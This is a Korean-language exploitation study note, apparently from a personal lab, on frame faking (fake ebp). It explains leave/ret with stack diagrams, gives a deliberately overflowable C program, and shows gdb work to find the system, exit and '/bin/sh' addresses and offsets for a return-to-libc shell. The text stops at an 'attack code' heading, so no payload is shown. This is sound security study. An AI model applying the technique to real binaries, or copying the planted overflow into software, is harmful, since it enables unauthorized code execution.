# 03. Frame Faking (fake ebp)

* 함수가 호출될 때마다 새롭게 스택프레임이 만들어지고 반환될 때 ebp+4의 주소에서 ret를 불러오는 것을 이용한 기법
* leave / ret 인스트럭션에 대한 이해 필요



## leave / ret 이해하기

* 함수의 구성
  * 모든 함수는 프롤로그로 시작하여 에필로그로 종료됨
  * 이것이 필요한 이유는 함수의 데이터들을 넣을 스택프레임을 만들고, 반환하기 위해서임

```assembly
// 함수 프롤로그
   0x08049172 <+0>:	push   ebp
   0x08049173 <+1>:	mov    ebp,esp
   ...(중략)
// 함수 에필로그
   0x08049196 <+36>:	leave
   0x08049197 <+37>:	ret
```

* leave / ret 의 구성

```assembly
leave
	mov esp, ebp  # esp에 현재의 ebp를 넣음
	pop ebp		  # 스택 최상단(esp)에서 값을 뽑아 ebp로 넣음
ret
	pop eip		  # 스택 최상단(esp)에서 값을 뽑아 eip로 넣음
	jmp eip		  # eip로 점프
```

* 이해를 돕기 위해 도형화 하면

```
1. main에서 sum을 호출하는 상황
call sum
push ebp
mov	 ebp, esp
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ (높은주소)
......
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
메인으로 돌아가야할 ret
━━━━━━━━━━━━━━━━━━━━━━━━━━━
이전 스택 프레임의 ebp						<---- esp
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━



2. 이후 아래 스택에 sum에서 사용하는 데이터들이 사용될 것임

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ (높은주소)
......
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
메인으로 돌아가야할 ret
━━━━━━━━━━━━━━━━━━━━━━━━━━━
이전 스택 프레임의 ebp					
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
....
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
....									<---- esp
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

3. Leave (mov esp, ebp)
ebp에는 현재 프레임의 최하단이 들어있으므로 이전 스택 프레임의 ebp가 저장되어 있는 곳으로 esp가 옮겨짐
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ (높은주소)
......
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
메인으로 돌아가야할 ret
━━━━━━━━━━━━━━━━━━━━━━━━━━━
이전 스택 프레임의 ebp						<---- esp
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

4. Leave (pop ebp)
esp가 가리키는 값을 뽑아 ebp레지스터에 저장: 즉 ebp에 이전 스택 프레임의 ebp가 저장되고 esp는 내려가 ret를 가리키게 됨
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ (높은주소)
......
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
메인으로 돌아가야할 ret						<---- esp
━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. ret(pop eip)
esp가 가리키던 값, 즉 ret 값을 뽑아 eip 로 전달
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ (높은주소)
......									<---- esp
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

6. ret(jmp eip)
eip가 가리키는 값으로 CPU 실행을 옮김
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ (높은주소)
......									<---- esp
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
```



## Frame Fake 이해

* 위에서 봤다시피 leave / ret가 실행될 때 아래와 같은 과정을 거친다
  * mov esp, ebp : esp에 현재 프레임의 ebp를 넣어 현재 프레임의 최하단으로 esp 이동
  * pop ebp : 스택의 최하단에는 이전 프레임(main등)의 ebp가 있는데, 이 값을 ebp로 넣음
  * pop eip : 위 esp+4에는 돌아갈 ret가 저장되어 있고, 이를 뽑아 eip 레지스터에 넣음
  * jmp eip : eip레지스터가 가리키는 주소로 이동
* 이때 만약 payload에 가짜 프레임을 제작하여 사용하려면 어떻게 해야할까?
  * 아래와 같은 경우를 상상해 보자.
  * 어떤 주소는 ebp에 저장되어 다음 스택 프레임의 ebp가 될 것이다.
  * 그리고 ret를 이용해 돌아가야하는데, 다시 leave - ret 가젯이 존재한다.
  * 그럼 다시 leave를 해야하므로 아래와 같은 과정을 거친다.
    * mov esp, ebp : 바뀐 ebp를 esp에 넣는다.
    * pop ebp : 바뀐 esp(바뀐 ebp)의 값은 다시 ebp로 생각되어 이 값을 뽑아 ebp에 넣는다
    * pop eip: 바뀐 esp가 한번 변경되므로 위의 esp(위의 ebp) + 4에 ret가 존재하고 이를 eip에 넣는다.
    * jmp: 위에서 뽑아온 eip로 점프한다.

```
# 함수호출 후 여러 변수 생성까지 끝난 상황

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━			━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
......								
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ 			━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
메인으로 돌아가야할 ret					leave - ret 가젯				
━━━━━━━━━━━━━━━━━━			━━━━━━━━━━━━━━━━━━
이전 스택 프레임의 ebp					(어떤 주소)
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━			━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
....								
....								
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━			━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

```

* 위에서 중요한 것은 ret에 leave-ret 가젯을 넣었을 때 이전 스택 프레임의 ebp가 들어가야하는 곳, 위의 (어떤주소) 부분에 들어가는 값을 기준으로 (어떤주소)+4에 ret가 들어간다는 것이다.
* 즉 우리가 원하는 주소인 쉘코드나 system주소에서 4를 뺀 값을 (어떤 주소)에 넣는다면 공격이 성공한다는 의미이다.



## RTL 공격과 조합

```c
//gcc -m32 -w -no-pie -fno-stack-protector -o ff_rtl ff_rtl.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>

void vuln(){
    char buf[50];
    printf("buf[0] address : %p\n",buf);
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 70);
}

void main(){
    vuln();
}
```

* buf 주소와 printf 주소가 릭이 되었다고 가정하기 위해 문제에 버퍼 주소와 printf 주소를 출력하게 함
* 이때 system 주소가 ret가 되도록 하려면 system 주소를 담고 있는 스택 주소 -4를 vuln의 스택프레임 최하단에 덮어써야함
  * 따라서 최종 스택 모양은 아래와 같음

```
(높은 주소)
━━━━━━━━━━━━━━━━━━━━━━━━━━━ main의 스택 프레임
......
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
leave-ret 가젯
━━━━━━━━━━━━━━━━━━━━━━━━━━━ vuln의 스택 프레임
xxxxxxx 주소					
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
/bin/sh 문자열 주소
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
dummy(exit주소)
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
system 주소
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
xxxxxxx(\x90\x90\x90\x90)			<---- 이곳을 가리켜야함
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
(낮은 주소)
```

* gdb를 통해 필요한 정보를 알아냄
  * system 주소: 0xf7e03980
  * printf 주소: 0xf7e178c0
  * '/bin/sh' 문자열주소: 0xf7f43aaa
  * libc base 주소: 0xf7dc5000
  * leave-ret 가젯: 0x080491ed

```
Breakpoint 1, 0x080491ef in main ()
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xf7e03980 <system>
gdb-peda$ print printf
$2 = {<text variable, no debug info>} 0xf7e178c0 <printf>
gdb-peda$ p exit
$3 = {<text variable, no debug info>} 0xf7df69b0 <exit>
gdb-peda$ find '/bin/sh'
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f43aaa ("/bin/sh")
gdb-peda$ info proc map
process 29107
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /root/Study/LinuxExTech/03.FrameFaking/ff_rtl2
	 0x8049000  0x804a000     0x1000     0x1000 /root/Study/LinuxExTech/03.FrameFaking/ff_rtl2
	 0x804a000  0x804b000     0x1000     0x2000 /root/Study/LinuxExTech/03.FrameFaking/ff_rtl2
	 0x804b000  0x804c000     0x1000     0x2000 /root/Study/LinuxExTech/03.FrameFaking/ff_rtl2
	 0x804c000  0x804d000     0x1000     0x3000 /root/Study/LinuxExTech/03.FrameFaking/ff_rtl2
	0xf7dc5000 0xf7dde000    0x19000        0x0 /usr/lib32/libc-2.28.so
	0xf7dde000 0xf7f2c000   0x14e000    0x19000 /usr/lib32/libc-2.28.so

gdb-peda$ c
Continuing.
buf[50] address : 0xffffd59a
Printf() address : 0xf7e178c0
AAAA
Breakpoint 2, 0x08049206 in main ()

gdb-peda$ disass vuln
   0x080491ed <+107>:	leave
   0x080491ee <+108>:	ret

```

* 오프셋 계산

```
gdb-peda$ p/x 0xf7e03980 - 0xf7dc5000 # system주소 - libc 시작점
$4 = 0x3e980
gdb-peda$ p/x 0xf7e178c0  - 0xf7dc5000 # printf주소 - libc 시작점
$5 = 0x528c0
gdb-peda$ p/x 0xf7f43aaa - 0xf7dc5000 # /bin/sh 주소 - libc 시작점
$6 = 0x17eaaa
gdb-peda$ p/x 0xf7df69b0 - 0xf7dc5000 # exit 주소 - libc 시작점
$8 = 0x319b0
```

* buf와 ebp가 저장되어 있는 곳과의 거리 계산

```
#ebp저장 위치: b *vul+3하여 ebp가 저장된 주소 확인
gdb-peda$ i r $esp
esp            0xffffd5d8	0xffffd5d8

#buf위치: call read에 브레이크포인트하여 read함수의 두번째인자(문자열주소) 확인
gdb-peda$ x/10wx $esp
0xffffd580:	0x00000000	0xffffd59a	0x00000046	0x0804918e
0xffffd590:	0x00000000	0xf7f9f000	0xf7df6a89	0xf7fa2588
0xffffd5a0:	0xf7f9f000	0xf7f9f000
gdb-peda$

# 거리 계산: ebp저장위치 -  buf위치
gdb-peda$ p/d 0xffffd5d8 - 0xffffd59a
$10 = 62
```



* 이중 printf 주소를 leak했다는 가정이므로 printf의 오프셋을 이용해 libc base를 구함
  * libcbase = 릭된 printf의 주소- printf오프셋

* 공격코드
